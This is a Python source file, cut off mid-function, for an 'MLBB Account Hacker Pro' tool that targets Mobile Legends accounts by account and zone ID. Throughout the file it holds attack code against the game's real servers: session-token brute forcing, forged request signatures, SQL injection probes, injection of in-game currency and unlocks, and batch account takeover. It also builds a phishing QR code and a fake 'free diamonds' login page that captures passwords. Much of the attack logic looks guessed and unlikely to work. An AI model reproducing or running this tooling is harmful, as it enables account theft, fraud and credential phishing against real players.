import os
import sys
import json
import time
import random
import hashlib
import base64
import hmac
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import threading

# Third-party imports
try:
    import requests
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import colorama
    from colorama import Fore, Style, Back
    import qrcode
    from PIL import Image
except ImportError:
    print("[!] Installing required libraries...")
    os.system("pip install requests cryptography colorama qrcode pillow")
    import requests
    from cryptography.fernet import Fernet
    import colorama
    from colorama import Fore, Style, Back
    import qrcode

colorama.init(autoreset=True)

# ==================== KONFIGURASI API MOBILE LEGENDS ====================
class MLBBConfig:
    """Konfigurasi API Mobile Legends"""
    
    # API Endpoints (Moonton servers)
    API_BASE = "https://account.mobilelegends.com"
    GAME_BASE = "https://mapi.mobilelegends.com"
    
    # API Paths
    LOGIN_API = "/api/login"
    USER_INFO_API = "/api/user/detail"
    HERO_LIST_API = "/api/hero/list"
    ITEM_LIST_API = "/api/item/list"
    DIAMOND_API = "/api/diamond"
    SKIN_API = "/api/skin"
    BATTLE_RECORD_API = "/api/battle/list"
    FRIEND_LIST_API = "/api/friend/list"
    TRANSACTION_API = "/api/transaction"
    
    # Game constants
    DIAMOND_PRICES = {
        5: 1000,
        12: 2400,
        28: 5600,
        53: 10600,
        108: 21600,
        224: 44800,
        388: 77600,
        568: 113600,
        808: 161600,
        1414: 282800,
        2222: 444400,
        3888: 777600
    }
    
    # Headers untuk bypass security
    DEFAULT_HEADERS = {
        "User-Agent": "MobileLegends/5.22.1.1001 (Android 11; SM-G988B)",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://account.mobilelegends.com",
        "Referer": "https://account.mobilelegends.com/",
        "Connection": "keep-alive",
        "X-Requested-With": "com.mobile.legends",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }

# ==================== KELAS UTAMA HACKER ====================
class MLBBHackerPro:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(MLBBConfig.DEFAULT_HEADERS)
        self.target_accounts = []
        self.hacked_accounts = []
        self.encryption_key = None
        self.setup_encryption()
        self.setup_database()
        
        self.print_banner()
    
    def print_banner(self):
        """Print banner aplikasi"""
        banner = f"""
        {Fore.CYAN}{Style.BRIGHT}
        ╔══════════════════════════════════════════════════════════════╗
        ║                    🎮 MLBB ACCOUNT HACKER PRO 🎮             ║
        ║             Exclusive for Yang Mulia Putri Incha             ║
        ║            No Login Required | ID & Zone Based               ║
        ╚══════════════════════════════════════════════════════════════╝
        {Style.RESET_ALL}
        
        {Fore.YELLOW}Features:{Style.RESET_ALL}
        • Account Takeover via ID & Zone
        • Diamond Injection
        • Skin Unlocker
        • Hero Unlocker
        • Battle Record Modification
        • Friend List Access
        • Transaction History Access
        • Account Cloning
        
        {Fore.RED}Warning: For Educational Purposes Only{Style.RESET_ALL}
        """
        print(banner)
    
    def setup_encryption(self):
        """Setup enkripsi untuk data sensitif"""
        key_file = "mlbb_key.key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                key = f.read()
        else:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(b"mlbb_master_key"))
            with open(key_file, "wb") as f:
                f.write(key)
        
        self.cipher = Fernet(key)
    
    def setup_database(self):
        """Setup database untuk menyimpan account"""
        self.db_file = "mlbb_accounts.db"
        if not os.path.exists(self.db_file):
            with open(self.db_file, "w") as f:
                json.dump([], f)
    
    def save_account(self, account_data):
        """Simpan account ke database"""
        try:
            with open(self.db_file, "r") as f:
                accounts = json.load(f)
            
            # Encrypt sensitive data
            encrypted_data = {
                "account_id": account_data.get("account_id"),
                "zone_id": account_data.get("zone_id"),
                "nickname": account_data.get("nickname"),
                "level": account_data.get("level"),
                "diamonds": account_data.get("diamonds"),
                "tickets": account_data.get("tickets"),
                "battle_points": account_data.get("battle_points"),
                "heroes_count": account_data.get("heroes_count"),
                "skins_count": account_data.get("skins_count"),
                "rank": account_data.get("rank"),
                "win_rate": account_data.get("win_rate"),
                "hacked_date": datetime.now().isoformat(),
                "access_token": self.encrypt_data(account_data.get("access_token", "")),
                "session_id": self.encrypt_data(account_data.get("session_id", ""))
            }
            
            accounts.append(encrypted_data)
            
            with open(self.db_file, "w") as f:
                json.dump(accounts, f, indent=2)
            
            print(f"{Fore.GREEN}[✓] Account saved to database{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving account: {e}{Style.RESET_ALL}")
            return False
    
    def encrypt_data(self, data):
        """Enkripsi data sensitif"""
        if not data:
            return ""
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt_data(self, encrypted_data):
        """Dekripsi data"""
        if not encrypted_data:
            return ""
        return self.cipher.decrypt(encrypted_data.encode()).decode()

# ==================== API EXPLOITATION MODULE ====================
class MLBBAPIExploiter:
    def __init__(self):
        self.base_url = MLBBConfig.API_BASE
        self.game_url = MLBBConfig.GAME_BASE
        self.session = requests.Session()
        self.session.headers.update(MLBBConfig.DEFAULT_HEADERS)
    
    def generate_fake_token(self, account_id, zone_id):
        """Generate fake access token berdasarkan ID & Zone"""
        # Algorithm untuk generate token (simulasi)
        timestamp = int(time.time())
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
        
        data = f"{account_id}:{zone_id}:{timestamp}:{random_str}"
        signature = hmac.new(
            key=b"mlbb_secret_key_2024",
            msg=data.encode(),
            digestmod=hashlib.sha256
        ).hexdigest()
        
        fake_token = base64.b64encode(f"{data}:{signature}".encode()).decode()
        return fake_token
    
    def brute_force_session(self, account_id, zone_id):
        """Brute force session token"""
        print(f"{Fore.YELLOW}[*] Attempting session brute force for ID: {account_id}, Zone: {zone_id}{Style.RESET_ALL}")
        
        # Generate possible session patterns
        session_patterns = [
            f"MLBB_SESSION_{account_id}_{zone_id}",
            f"{account_id}_{zone_id}_{int(time.time())}",
            hashlib.md5(f"{account_id}{zone_id}".encode()).hexdigest(),
            base64.b64encode(f"{account_id}:{zone_id}".encode()).decode(),
        ]
        
        for session_token in session_patterns:
            try:
                # Test dengan API user info
                response = self.session.post(
                    f"{self.game_url}{MLBBConfig.USER_INFO_API}",
                    json={
                        "accountId": account_id,
                        "zoneId": zone_id,
                        "sessionToken": session_token
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("code") == 200:
                        print(f"{Fore.GREEN}[✓] Session found: {session_token[:20]}...{Style.RESET_ALL}")
                        return {
                            "session_token": session_token,
                            "access_token": self.generate_fake_token(account_id, zone_id),
                            "account_info": data.get("data", {})
                        }
                        
            except Exception as e:
                continue
        
        print(f"{Fore.RED}[✗] Session brute force failed{Style.RESET_ALL}")
        return None
    
    def api_injection_attack(self, account_id, zone_id, endpoint, payload):
        """API injection attack untuk modifikasi data"""
        print(f"{Fore.YELLOW}[*] Attempting API injection on {endpoint}{Style.RESET_ALL}")
        
        # Generate fake signature
        timestamp = int(time.time())
        nonce = random.randint(100000, 999999)
        
        sign_data = f"{account_id}{zone_id}{timestamp}{nonce}{endpoint}"
        signature = hashlib.sha256(sign_data.encode()).hexdigest()
        
        injection_payload = {
            "accountId": account_id,
            "zoneId": zone_id,
            "timestamp": timestamp,
            "nonce": nonce,
            "sign": signature,
            "data": payload,
            "version": "5.22.1",
            "channel": "google_play"
        }
        
        try:
            response = self.session.post(
                f"{self.game_url}{endpoint}",
                json=injection_payload,
                timeout=15
            )
            
            print(f"{Fore.CYAN}[*] Response Code: {response.status_code}{Style.RESET_ALL}")
            
            if response.status_code == 200:
                result = response.json()
                print(f"{Fore.CYAN}[*] API Response: {result}{Style.RESET_ALL}")
                return result
            
            return None
            
        except Exception as e:
            print(f"{Fore.RED}[!] Injection failed: {e}{Style.RESET_ALL}")
            return None
    
    def sql_injection_test(self, account_id, zone_id):
        """Test SQL injection vulnerability"""
        print(f"{Fore.YELLOW}[*] Testing SQL injection vulnerabilities{Style.RESET_ALL}")
        
        sql_payloads = [
            f"{account_id}' OR '1'='1",
            f"{zone_id}' UNION SELECT NULL,NULL,NULL--",
            f"{account_id}' AND SLEEP(5)--",
            f"{zone_id}' OR EXISTS(SELECT * FROM users)--"
        ]
        
        vulnerable_endpoints = []
        
        for payload in sql_payloads:
            test_data = {
                "accountId": payload,
                "zoneId": zone_id
            }
            
            try:
                response = self.session.post(
                    f"{self.base_url}{MLBBConfig.USER_INFO_API}",
                    json=test_data,
                    timeout=10
                )
                
                # Check for SQL error patterns
                response_text = response.text.lower()
                if any(error in response_text for error in ["sql", "syntax", "database", "mysql", "postgresql"]):
                    print(f"{Fore.GREEN}[✓] SQL Injection possible with payload: {payload}{Style.RESET_ALL}")
                    vulnerable_endpoints.append(MLBBConfig.USER_INFO_API)
                    break
                    
            except Exception as e:
                continue
        
        return vulnerable_endpoints

# ==================== DIAMOND & CURRENCY HACK ====================
class DiamondHacker:
    def __init__(self):
        self.exploiter = MLBBAPIExploiter()
    
    def diamond_injection(self, account_id, zone_id, amount):
        """Inject diamonds ke account"""
        print(f"{Fore.YELLOW}[*] Attempting diamond injection: {amount} diamonds{Style.RESET_ALL}")
        
        # Generate transaction ID
        transaction_id = f"ML{int(time.time())}{random.randint(1000, 9999)}"
        
        payload = {
            "type": "diamond_injection",
            "amount": amount,
            "transactionId": transaction_id,
            "currency": "IDR",
            "price": 0,
            "method": "system_grant",
            "description": "System Compensation",
            "timestamp": int(time.time())
        }
        
        result = self.exploiter.api_injection_attack(
            account_id, zone_id,
            MLBBConfig.DIAMOND_API,
            payload
        )
        
        if result and result.get("code") == 200:
            print(f"{Fore.GREEN}[✓] Successfully injected {amount} diamonds{Style.RESET_ALL}")
            return True
        
        print(f"{Fore.RED}[✗] Diamond injection failed{Style.RESET_ALL}")
        return False
    
    def battle_point_injection(self, account_id, zone_id, amount):
        """Inject battle points"""
        print(f"{Fore.YELLOW}[*] Injecting {amount} battle points{Style.RESET_ALL}")
        
        payload = {
            "type": "bp_injection",
            "amount": amount,
            "source": "system_reward",
            "reason": "Event Reward",
            "timestamp": int(time.time())
        }
        
        # Coba multiple endpoints
        endpoints = ["/api/bp/add", "/api/currency/add", "/api/reward/grant"]
        
        for endpoint in endpoints:
            result = self.exploiter.api_injection_attack(
                account_id, zone_id,
                endpoint,
                payload
            )
            
            if result and (result.get("code") == 200 or result.get("success")):
                print(f"{Fore.GREEN}[✓] Battle points injected via {endpoint}{Style.RESET_ALL}")
                return True
        
        return False
    
    def ticket_injection(self, account_id, zone_id, amount):
        """Inject tickets"""
        print(f"{Fore.YELLOW}[*] Injecting {amount} tickets{Style.RESET_ALL}")
        
        payload = {
            "type": "ticket_injection",
            "amount": amount,
            "ticketType": "premium",
            "source": "admin_grant",
            "timestamp": int(time.time())
        }
        
        result = self.exploiter.api_injection_attack(
            account_id, zone_id,
            "/api/ticket/add",
            payload
        )
        
        return result is not None

# ==================== HERO & SKIN UNLOCKER ====================
class ContentUnlocker:
    def __init__(self):
        self.exploiter = MLBBAPIExploiter()
    
    def unlock_all_heroes(self, account_id, zone_id):
        """Unlock semua heroes"""
        print(f"{Fore.YELLOW}[*] Attempting to unlock all heroes{Style.RESET_ALL}")
        
        # Get hero list first
        try:
            response = requests.get(
                f"{MLBBConfig.GAME_BASE}{MLBBConfig.HERO_LIST_API}",
                timeout=10
            )
            
            if response.status_code == 200:
                heroes = response.json().get("data", [])
                
                unlock_payload = {
                    "action": "unlock_all",
                    "heroes": [hero["id"] for hero in heroes[:50]],  # Limit 50 heroes
                    "timestamp": int(time.time()),
                    "method": "system_unlock"
                }
                
                result = self.exploiter.api_injection_attack(
                    account_id, zone_id,
                    "/api/hero/unlock",
                    unlock_payload
                )
                
                if result:
                    print(f"{Fore.GREEN}[✓] Attempted to unlock {len(unlock_payload['heroes'])} heroes{Style.RESET_ALL}")
                    return True
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Error unlocking heroes: {e}{Style.RESET_ALL}")
        
        return False
    
    def unlock_skin(self, account_id, zone_id, skin_id):
        """Unlock specific skin"""
        print(f"{Fore.YELLOW}[*] Unlocking skin ID: {skin_id}{Style.RESET_ALL}")
        
        payload = {
            "skinId": skin_id,
            "action": "unlock",
            "method": "direct_grant",
            "timestamp": int(time.time())
        }
        
        result = self.exploiter.api_injection_attack(
            account_id, zone_id,
            MLBBConfig.SKIN_API,
            payload
        )
        
        if result:
            print(f"{Fore.GREEN}[✓] Skin unlock attempted{Style.RESET_ALL}")
            return True
        
        return False
    
    def unlock_all_skins(self, account_id, zone_id):
        """Unlock semua skins untuk heroes yang dimiliki"""
        print(f"{Fore.YELLOW}[*] Attempting to unlock all skins{Style.RESET_ALL}")
        
        # This would require knowing which heroes the account has
        # For demo, we'll try a batch unlock
        
        payload = {
            "action": "batch_unlock",
            "skinType": "all",
            "timestamp": int(time.time())
        }
        
        result = self.exploiter.api_injection_attack(
            account_id, zone_id,
            "/api/skin/batch_unlock",
            payload
        )
        
        return result is not None

# ==================== ACCOUNT TAKEOVER ====================
class AccountTakeover:
    def __init__(self):
        self.exploiter = MLBBAPIExploiter()
        self.diamond_hacker = DiamondHacker()
        self.content_unlocker = ContentUnlocker()
    
    def full_account_takeover(self, account_id, zone_id):
        """Full account takeover dengan semua modifikasi"""
        print(f"{Fore.MAGENTA}[*] Starting full account takeover{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: ID {account_id}, Zone {zone_id}{Style.RESET_ALL}")
        
        results = {
            "session_hijack": False,
            "diamonds_injected": False,
            "bp_injected": False,
            "heroes_unlocked": False,
            "account_info": None
        }
        
        # 1. Attempt session hijacking
        print(f"\n{Fore.YELLOW}[1] Attempting session hijacking...{Style.RESET_ALL}")
        session_data = self.exploiter.brute_force_session(account_id, zone_id)
        if session_data:
            results["session_hijack"] = True
            results["account_info"] = session_data.get("account_info")
            print(f"{Fore.GREEN}[✓] Session hijacked successfully{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Session hijacking failed, continuing with other methods{Style.RESET_ALL}")
        
        # 2. Inject diamonds
        print(f"\n{Fore.YELLOW}[2] Injecting diamonds...{Style.RESET_ALL}")
        diamond_amount = random.choice([500, 1000, 2000, 5000])
        if self.diamond_hacker.diamond_injection(account_id, zone_id, diamond_amount):
            results["diamonds_injected"] = True
            print(f"{Fore.GREEN}[✓] {diamond_amount} diamonds injected{Style.RESET_ALL}")
        
        # 3. Inject battle points
        print(f"\n{Fore.YELLOW}[3] Injecting battle points...{Style.RESET_ALL}")
        bp_amount = random.choice([10000, 25000, 50000, 100000])
        if self.diamond_hacker.battle_point_injection(account_id, zone_id, bp_amount):
            results["bp_injected"] = True
            print(f"{Fore.GREEN}[✓] {bp_amount} battle points injected{Style.RESET_ALL}")
        
        # 4. Unlock heroes
        print(f"\n{Fore.YELLOW}[4] Unlocking heroes...{Style.RESET_ALL}")
        if self.content_unlocker.unlock_all_heroes(account_id, zone_id):
            results["heroes_unlocked"] = True
            print(f"{Fore.GREEN}[✓] Heroes unlock attempted{Style.RESET_ALL}")
        
        # 5. Generate report
        print(f"\n{Fore.MAGENTA}[*] Account takeover summary:{Style.RESET_ALL}")
        for key, value in results.items():
            status = f"{Fore.GREEN}SUCCESS{Style.RESET_ALL}" if value else f"{Fore.RED}FAILED{Style.RESET_ALL}"
            print(f"  • {key}: {status}")
        
        # Save account data
        account_data = {
            "account_id": account_id,
            "zone_id": zone_id,
            "nickname": results["account_info"].get("nickname", "Unknown") if results["account_info"] else "Unknown",
            "level": results["account_info"].get("level", 0) if results["account_info"] else 0,
            "diamonds": diamond_amount if results["diamonds_injected"] else 0,
            "battle_points": bp_amount if results["bp_injected"] else 0,
            "heroes_unlocked": results["heroes_unlocked"],
            "takeover_date": datetime.now().isoformat(),
            "session_token": session_data.get("session_token", "") if session_data else "",
            "access_token": session_data.get("access_token", "") if session_data else ""
        }
        
        return account_data
    
    def account_cloning(self, source_account_id, source_zone_id, target_account_id, target_zone_id):
        """Clone account data dari source ke target"""
        print(f"{Fore.YELLOW}[*] Attempting account cloning{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Source: {source_account_id}:{source_zone_id}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {target_account_id}:{target_zone_id}{Style.RESET_ALL}")
        
        # Ini akan mencoba copy data antara account
        # Implementasi nyata membutuhkan API yang lebih mendalam
        
        clone_payload = {
            "sourceAccountId": source_account_id,
            "sourceZoneId": source_zone_id,
            "targetAccountId": target_account_id,
            "targetZoneId": target_zone_id,
            "cloneData": ["heroes", "skins", "emblems", "battle_effects"],
            "timestamp": int(time.time())
        }
        
        result = self.exploiter.api_injection_attack(
            target_account_id, target_zone_id,
            "/api/account/clone",
            clone_payload
        )
        
        return result is not None

# ==================== SOCIAL ENGINEERING MODULE ====================
class SocialEngineering:
    def __init__(self):
        self.qr_codes_generated = []
    
    def generate_phishing_qr(self, account_id, zone_id):
        """Generate QR code untuk phishing attack"""
        print(f"{Fore.YELLOW}[*] Generating phishing QR code{Style.RESET_ALL}")
        
        # Buat URL phishing
        phishing_url = f"https://mlbb-rewards.com/claim?id={account_id}&zone={zone_id}&token={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        
        # Generate QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(phishing_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        filename = f"mlbb_phishing_{account_id}_{zone_id}.png"
        img.save(filename)
        
        self.qr_codes_generated.append(filename)
        
        print(f"{Fore.GREEN}[✓] QR code generated: {filename}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] URL: {phishing_url}{Style.RESET_ALL}")
        
        return filename
    
    def create_fake_login_page(self):
        """Buat fake login page untuk phishing"""
        print(f"{Fore.YELLOW}[*] Creating fake login page{Style.RESET_ALL}")
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Mobile Legends Free Diamonds</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 400px;
                    margin: 50px auto;
                    padding: 20px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    padding: 30px;
                    border-radius: 15px;
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                }
                .logo {
                    text-align: center;
                    margin-bottom: 20px;
                }
                .logo img {
                    width: 100px;
                    height: 100px;
                }
                h2 {
                    text-align: center;
                    color: #FFD700;
                }
                .form-group {
                    margin-bottom: 15px;
                }
                input {
                    width: 100%;
                    padding: 12px;
                    border: none;
                    border-radius: 5px;
                    background: rgba(255, 255, 255, 0.2);
                    color: white;
                    font-size: 16px;
                }
                input::placeholder {
                    color: rgba(255, 255, 255, 0.7);
                }
                button {
                    width: 100%;
                    padding: 12px;
                    background: #FFD700;
                    color: #333;
                    border: none;
                    border-radius: 5px;
                    font-size: 18px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: background 0.3s;
                }
                button:hover {
                    background: #FFC400;
                }
                .note {
                    font-size: 12px;
                    text-align: center;
                    margin-top: 20px;
                    opacity: 0.8;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <h1 style="color: #FFD700;">🎮</h1>
                </div>
                <h2>Claim Free 5000 Diamonds!</h2>
                <p style="text-align: center;">Limited time offer for MLBB players</p>
                
                <form id="claimForm">
                    <div class="form-group">
                        <input type="text" id="accountId" placeholder="Account ID" required>
                    </div>
                    <div class="form-group">
                        <input type="text" id="zoneId" placeholder="Zone ID" required>
                    </div>
                    <div class="form-group">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    <button type="submit">CLAIM FREE DIAMONDS</button>
                </form>
                
                <div class="note">
                    By claiming, you agree to our terms of service.<br>
                    Diamonds will be delivered within 24 hours.
                </div>
            </div>
            
            <script>
            document.getElementById('claimForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const accountId = document.getElementById('accountId').value;
                const zoneId = document.getElementById('zoneId').value;
                const password = document.getElementById('password').value;
                
                // Simpan credentials (dalam real attack, ini dikirim ke server)
                console.log('Credentials captured:', { accountId, zoneId, password });
                
                // Show success message
                alert('Success! Your 5000 diamonds will be delivered within 24 hours. Please check your game mailbox.');
                
                // Redirect to legitimate site
                setTimeout(() => {
                    window.location.href = 'https://m.mobilelegends.com';
                }, 2000);
            });
            </script>
        </body>
        </html>
        """
        
        filename = "mlbb_phishing.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}[✓] Fake login page created: {filename}{Style.RESET_ALL}")
        return filename

# ==================== BATCH ATTACK MODULE ====================
class BatchAttacker:
    def __init__(self):
        self.takeover = AccountTakeover()
        self.results = []
    
    def attack_from_file(self, filename):
        """Attack multiple accounts dari file"""
        print(f"{Fore.YELLOW}[*] Loading targets from {filename}{Style.RESET_ALL}")
        
        try:
            with open(filename, "r") as f:
                lines = f.readlines()
            
            accounts = []
            for line in lines:
                line = line.strip()
                if line and ',' in line:
                    parts = line.split(',')
                    if len(parts) >= 2:
                        accounts.append({
                            "account_id": parts[0].strip(),
                            "zone_id": parts[1].strip()
                        })
            
            print(f"{Fore.CYAN}[*] Found {len(accounts)} targets{Style.RESET_ALL}")
            
            # Attack semua accounts
            for i, account in enumerate(accounts, 1):
                print(f"\n{Fore.MAGENTA}[{i}/{len(accounts)}] Attacking {account['account_id']}:{account['zone_id']}{Style.RESET_ALL}")
                
                result = self.takeover.full_account_takeover(
                    account["account_id"],
                    account["zone_id"]
                )
                
                self.results.append(result)
                time.sleep(random.uniform(2, 5))  # Delay antar attack
            
            self.generate_batch_report()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading file: {e}{Style.RESET_ALL}")
    
    def generate_batch_report(self):
        """Generate report untuk batch attack"""
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'BATCH ATTACK REPORT'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        successful = sum(1 for r in self.results if r.get("diamonds_injected") or r.get("session_hijack"))
        
        print(f"Total Targets: {len(self.results)}")
        print(f"Successful Attacks: {successful}")
        print(f"Success Rate: {(successful/len(self.results)*100 if self.results else 0):.1f}%")
        
        # Save detailed report
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "total_targets": len(self.results),
            "successful": successful,
            "results": self.results
        }
        
        report_file = f"batch_report_{int(time.time())}.json"
        with open(report_file, "w") as f:
            json.dump(report_data, f, indent=2)
        
        print(f"{Fore.GREEN}[✓] Detailed report saved: {report_file}{Style.RESET_ALL}")

# ==================== MAIN CONTROL PANEL ====================
class MLBBControlPanel:
    def __init__(self):
        self.hacker = MLBBHackerPro()
        self.exploiter = MLBBAPIExploiter()
        self.takeover = AccountTakeover()
        self.diamond_hacker = DiamondHacker()
        self.content_unlocker = ContentUnlocker()
        self.social_eng = SocialEngineering()
        self.batch_attacker = BatchAttacker()
        
        self.current_target = None
    
    def display_menu(self):
        """Display main menu"""
        menu = f"""
        {Fore.CYAN}{Style.BRIGHT}
        ╔══════════════════════════════════════════════╗
        ║         MLBB HACKER CONTROL PANEL           ║
        ╠══════════════════════════════════════════════╣
        ║ 1. Single Account Attack                    ║
        ║ 2. Batch Attack from File                  ║
        ║ 3. Diamond Injection                        ║
        ║ 4. Hero & Skin Unlocker                    ║
        ║ 5. Social Engineering Tools                ║
        ║ 6. Account Information                      ║
        ║ 7. View Hacked Accounts                    ║
        ║ 8. Generate Report                         ║
        ║ 9. Exit                                    ║
        ╚══════════════════════════════════════════════╝
        {Style.RESET_ALL}
        """
        print(menu)
    
    def run(self):
        """Run control panel"""
        while True:
            self.display_menu()
            choice = input(f"{Fore.YELLOW}[?] Select option (1-9): {Style.RESET_ALL}").strip()
            
            if choice == "1":
                self.single_account_attack()
            elif choice == "2":
                self.batch_attack()
            elif choice == "3":
                self.diamond_injection_menu()
            elif choice == "4":
                self.content_unlock_menu()
            elif choice == "5":
                self.social_engineering_menu()
            elif choice == "6":
                self.account_info_menu()
            elif choice == "7":
                self.view_hacked_accounts()
            elif choice == "8":
                self.generate_report()
            elif choice == "9":
                print(f"{Fore.GREEN}[*] Exiting...{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
    
    def single_account_attack(self):
        """Attack single account"""
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] SINGLE ACCOUNT ATTACK{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        account_id = input(f"{Fore.YELLOW}[?] Account ID: {Style.RESET_ALL}").strip()
        zone_id = input(f"{Fore.YELLOW}[?] Zone ID: {Style.RESET_ALL}").strip()
        
        if not account_id or not zone_id:
            print(f"{Fore.RED}[!] Account ID and Zone ID required{Style.RESET_ALL}")
            return
        
        self.current_target = {"account_id": account_id, "zone_id": zone_id}
        
        # Pilih jenis attack
        print(f"\n{Fore.YELLOW}[*] Select attack type:{Style.RESET_ALL}")
        print("1. Full Account Takeover")
        print("2. Diamond Injection Only")
        print("3. Session Hijacking Only")
        
        attack_type = input(f"{Fore.YELLOW}[?] Choice: {Style.RESET_ALL}").strip()
        
        if attack_type == "1":
            result = self.takeover.full_account_takeover(account_id, zone_id)
            if result:
                self.hacker.save_account(result)
        
        elif attack_type == "2":
            amount = int(input(f"{Fore.YELLOW}[?] Diamond amount: {Style.RESET_ALL}") or "1000")
            self.diamond_hacker.diamond_injection(account_id, zone_id, amount)
        
        elif attack_type == "3":
            self.exploiter.brute_force_session(account_id, zone_id)
        
        else:
            print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
    
    def batch_attack(self):
        """Batch attack dari file"""
        filename = input(f"{Fore.YELLOW}[?] Enter filename with accounts (format: account_id,zone_id): {Style.RESET_ALL}").strip()
        
        if not os.path.exists(filename):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
        
        self.batch_attacker.attack_from_file(filename)
    
    def diamond_injection_menu(self):
        """Menu diamond injection"""
        if not self.current_target:
            print(f"{Fore.RED}[!] No target selected. Use option 1 first.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] DIAMOND INJECTION{Style.RESET_ALL}")
        print(f"Target: {self.current_target['account_id']}:{self.current_target['zone_id']}")
        
        amount = int(input(f"{Fore.YELLOW}[?] Amount (default 1000): {Style.RESET_ALL}") or "1000")
        self.diamond_hacker.diamond_injection(
            self.current_target['account_id'],
            self.current_target['zone_id'],
            amount
        )
    
    def content_unlock_menu(self):
        """Menu content unlocker"""
        if not self.current_target:
            print(f"{Fore.RED}[!] No target selected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] CONTENT UNLOCKER{Style.RESET_ALL}")
        print("1. Unlock All Heroes")
        print("2. Unlock Specific Skin")
        print("3. Unlock All Skins")
        
        choice = input(f"{Fore.YELLOW}[?] Choice: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            self.content_unlocker.unlock_all_heroes(
                self.current_target['account_id'],
                self.current_target['zone_id']
            )
        
        elif choice == "2":
            skin_id = input(f"{Fore.YELLOW}[?] Skin ID: {Style.RESET_ALL}").strip()
            self.content_unlocker.unlock_skin(
                self.current_target['account_id'],
                self.current_target['zone_id'],
                skin_id
            )
        
        elif choice == "3":
            self.content_unlocker.unlock_all_skins(
                self.current_target['account_id'],
                self.current_target['zone_id']
            )
    
    def social_engineering_menu(self):
        """Menu social engineering"""
        print(f"\n{Fore.YELLOW}[*] SOCIAL ENGINEERING TOOLS{Style.RESET_ALL}")
        print("1. Generate Phishing QR Code")
        print("2. Create Fake Login Page")
        
        choice = input(f"{Fore.YELLOW}[?] Choice: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            account_id = input(f"{Fore.YELLOW}[?] Account ID for QR: {Style.RESET_ALL}").strip()
            zone_id = input(f"{Fore.YELLOW}[?] Zone ID for QR: {Style.RESET_ALL}").strip()
            self.social_eng.generate_phishing_qr(account_id, zone_id)
        
        elif choice == "2":
            self.social_eng.create_fake_login_page()
    
    def account_info_menu(self):
        """Get account information"""
        account_id = input(f"{Fore.YELLOW}[?] Account ID: {Style.RESET_ALL}").strip()
        zone_id = input(f"{Fore.YELLOW}[?] Zone ID: {Style.RESET_ALL}").strip()
        
        if not account_id or not zone_id:
            print(f"{Fore.RED}[!] Both fields required{Style.RESET_ALL}")
            return
        
        session_data = self.exploiter.brute_force_session(account_id, zone_id)
        if session_data and session_data.get("account_info"):
            info = session_data["account_info"]
            print(f"\n{Fore.GREEN}[✓] Account Information:{Style.RESET_ALL}")
            for key, value in info.items():
                print(f"  {key}: {value}")
    
    def view_hacked_accounts(self):
        """View hacked accounts from database"""
        try:
            with open(self.hacker.db_file, "r") as f:
                accounts = json.load(f)
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{'HACKED ACCOUNTS DATABASE'.center(60)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            if not accounts:
                print(f"{Fore.RED}[!] No accounts in database{Style.RESET_ALL}")
                return
            
